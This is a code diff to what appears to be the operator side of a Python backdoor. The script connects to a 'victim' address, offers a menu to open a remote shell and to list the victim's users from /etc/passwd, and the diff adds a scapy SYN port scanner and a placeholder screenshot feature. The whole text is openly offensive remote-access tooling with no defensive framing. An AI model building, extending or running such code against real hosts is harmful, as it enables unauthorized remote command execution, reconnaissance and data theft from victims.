@@ -1,3 +1,5 @@
+from scapy.layers.inet import IP, TCP
+from scapy.all import *
 import socket
 
 
@@ -51,6 +53,23 @@ class GetInfo:
         elif self._os == "Linux":
             return "cut -d: -f1 /etc/passwd"
 
+    def screenshot(self):
+        pass
+
+
+class PortScanner:
+
+    def scanner(self):
+        ports_to_scan = {21: "FTP", 22: "SSH", 53: "DNS", 80: "HTTP", 443: "HTTPS", 445: "TEST", 6942: "TEST2"}
+        print("----------------------")
+        address = input("Enter the address to scan: ")
+        for port in ports_to_scan.keys():
+            print("Scanning port: {}".format(port))
+            resp = sr1(IP(dst=address)/TCP(dport=port, flags="S"), verbose=0)
+            if TCP in resp:
+                if resp[TCP].flags == "SA":
+                    print("\t\033[32mPort {}".format(port) + ": " + ports_to_scan[port] + " is open\033[0m")
+
 
 malware_addr = input("Enter the address of the victim: ")
 serv_addr = (malware_addr, 12345)
@@ -64,8 +83,10 @@ malware_os = s.recv(4096).decode('utf-8')
 getinfo = GetInfo(malware_os)
 shell = Shell()
 
+print("\n----------------------")
 message = input(
     "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
+
 while message != "exit":
     if message == "1":
         shell.set_next_command(True)
@@ -84,8 +105,13 @@ while message != "exit":
         shell.set_command(getinfo.get_users())
         shell.send()
         shell.receive()
+    elif message == "3":
+        scan = PortScanner()
+        scan.scanner()
 
+    print("\n----------------------")
     message = input(
         "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Type exit to quit\n\nAnswer: ")
+
 
 s.close()
